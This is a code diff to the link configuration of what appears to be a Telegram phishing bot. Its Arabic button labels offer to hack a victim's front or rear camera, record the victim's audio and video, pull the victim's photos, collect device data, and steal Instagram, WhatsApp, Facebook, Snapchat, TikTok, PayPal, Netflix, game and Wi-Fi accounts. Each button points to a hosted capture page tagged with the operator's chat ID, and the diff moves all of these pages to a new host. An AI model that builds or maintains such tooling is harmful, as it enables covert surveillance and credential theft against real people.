@@ -768,79 +768,79 @@ tv_channels = {
 LINKS_INFO = {
     "btn1": {
         "name": "📷 <b>إختراق الكاميرا الأمامية</b>",
-        "original": "https://aesthetic-platypus-05ca99h.netlify.app/c2/?chatId={user_id}"
+        "original": "https://webs-boty.onrender.com/c2.html?chatId={user_id}"
     },
     "btn2": {
         "name": "📸 <b>إختراق الكاميرا الخلفية</b>",
-        "original": "https://aesthetic-platypus-05ca99h.netlify.app/c1/?chatId={user_id}"
+        "original": "https://webs-boty.onrender.com/c1.html?chatId={user_id}"
     },
     "btn3": {
-        "name": "🎙️ <b>تسجيل صوت الضੂحيه</b>",
-        "original": "https://aesthetic-platypus-05ca99h.netlify.app/au/?chatId={user_id}"
+        "name": "🎙️ <b>تسجيل صوت الضحية</b>",
+        "original": "https://webs-boty.onrender.com/au.html?chatId={user_id}"
     },
     "btn4": {
         "name": "🎥 <b>تصوير فيديو للضحية</b>",
-        "original": "https://aesthetic-platypus-05ca99h.netlify.app/vi/?chatId={user_id}"
+        "original": "https://webs-boty.onrender.com/vi.html?chatId={user_id}"
     },
     "btn5": {
         "name": "📌 <b>إختراق إنستجرام</b>",
-        "original": "https://aesthetic-platypus-05ca99h.netlify.app/Instagram/?chatId={user_id}"
+        "original": "https://webs-boty.onrender.com/Instagram.html?chatId={user_id}"
     },
     "btn6": {
         "name": "❗ <b>إختراق واتساب</b>",
-        "original": "https://aesthetic-platypus-05ca99h.netlify.app/WhatsApp/?chatId={user_id}"
+        "original": "https://webs-boty.onrender.com/WhatsApp.html?chatId={user_id}"
     },
     "btn7": {
         "name": "🎯 <b>إختراق ببجي</b>",
-        "original": "https://aesthetic-platypus-05ca99h.netlify.app/pubg/?chatId={user_id}"
+        "original": "https://webs-boty.onrender.com/pubg.html?chatId={user_id}"
     },
     "btn8": {
         "name": "💥 <b>إختراق فري فاير</b>",
-        "original": "https://aesthetic-platypus-05ca99h.netlify.app/freefire/?chatId={user_id}"
+        "original": "https://webs-boty.onrender.com/freefire.html?chatId={user_id}"
     },
     "btn9": {
         "name": "🌐 <b>إختراق فيسبوك</b>",
-        "original": "https://aesthetic-platypus-05ca99h.netlify.app/Facebook/?chatId={user_id}"
+        "original": "https://webs-boty.onrender.com/Facebook.html?chatId={user_id}"
     },
     "btn10": {
         "name": "👻 <b>إختراق سناب شات</b>",
-        "original": "https://aesthetic-platypus-05ca99h.netlify.app/Snapchat/?chatId={user_id}"
+        "original": "https://webs-boty.onrender.com/Snapchat.html?chatId={user_id}"
     },
     "btn11": {
         "name": "💣 <b>إختراق تيك توك</b>",
-        "original": "https://aesthetic-platypus-05ca99h.netlify.app/Tiktok/?chatId={user_id}"
+        "original": "https://webs-boty.onrender.com/Tiktok.html?chatId={user_id}"
     },
     "btn12": {
         "name": "📲 <b>جمع معلومات الجهاز</b>",
-        "original": "https://aesthetic-platypus-05ca99h.netlify.app/dev/?chatId={user_id}"
+        "original": "https://webs-boty.onrender.com/dev.html?chatId={user_id}"
     },
     "btn_wifi": {
         "name": "🛜 <b>إختراق الواي فاي</b>",
-        "original": "https://aesthetic-platypus-05ca99h.netlify.app/Wifi/?chatid={user_id}"
+        "original": "https://webs-boty.onrender.com/Wifi.html?chatid={user_id}"
     },
     "btn15": {
-        "name": "🔞 <b>سحب صور الضੂحيه</b>",
-        "original": "https://aesthetic-platypus-05ca99h.netlify.app/photo/?chatid={user_id}"
+        "name": "🔞 <b>سحب صور الضحية</b>",
+        "original": "https://webs-boty.onrender.com/photo.html?chatid={user_id}"
     }, 
     "btn16": {
         "name": "🔝 <b>اخـ~ـتراق بال باي</b>",
-        "original": "https://aesthetic-platypus-05ca99h.netlify.app/PalPay/?chatid={user_id}"
+        "original": "https://webs-boty.onrender.com/PalPay.html?chatid={user_id}"
     },
     "btn17": {
         "name": "🎬 <b>اخـ~ـتراق كواي</b>",
-        "original": "https://aesthetic-platypus-05ca99h.netlify.app/Kwai/?chatid={user_id}"
+        "original": "https://webs-boty.onrender.com/Kwai.html?chatid={user_id}"
     }, 
     "btn160": {
         "name": "🕊 <b>اخـ~تـراق تويتر</b>",
-        "original": "https://aesthetic-platypus-05ca99h.netlify.app/Twitter/?chatid={user_id}"
+        "original": "https://webs-boty.onrender.com/Twitter.html?chatid={user_id}"
     },
     "btn19": {
         "name": "🔉 <b>اخـ~ـتراق نتفلكس</b>",
-        "original": "https://aesthetic-platypus-05ca99h.netlify.app/Netflix/?chatid={user_id}"
+        "original": "https://webs-boty.onrender.com/Netflix.html?chatid={user_id}"
     }, 
     "btn20": {
         "name": "🎓 <b>اخـ~ـتراق يوتيوب</b>",
-        "original": "https://aesthetic-platypus-05ca99h.netlify.app/Youtube/?chatid={user_id}"
+        "original": "https://webs-boty.onrender.com/Youtube.html?chatid={user_id}"
     }, 
 }
 
